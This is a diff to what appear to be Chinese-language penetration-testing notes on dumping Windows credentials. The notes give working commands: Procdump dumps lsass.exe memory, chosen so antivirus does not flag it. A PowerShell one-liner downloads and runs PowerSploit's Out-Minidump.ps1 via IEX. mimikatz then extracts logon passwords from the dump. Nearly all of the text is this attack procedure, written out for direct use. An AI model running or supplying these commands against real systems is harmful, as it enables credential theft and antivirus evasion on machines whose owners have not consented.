@@ -51,10 +51,20 @@ topics = ["Pentest"]
 
 * 导出hash本地得到密码  
     若mimikatz和getpass这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密，Procdump是微软官方的软件，应该不会被杀
-    * 上传Procdump.exe导出文件  
+    * 导出文件dmp文件  
+        * 上传Procdump.exe导出
+
+        > ```
         Procdump.exe -accepteula -ma lsass.exe lsass.dmp
-    * 下载lsass.dmp后用本地mimikatz解密  
-        先输入：mimikatz.exe "sekurlsa::minidump lsass.dmp"  
+        ```
+
+        * 或者执行PowerShell导出
+
+        > ```
+        powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); "Get-Process lsass | Out-Minidump"
+        ```
+    * 下载导出的dmp文件后用本地mimikatz解密  
+        先输入：```mimikatz.exe "sekurlsa::minidump lsass.dmp"```  
         后输入：sekurlsa::logonpasswords
 
 ### 0x02 开启3389
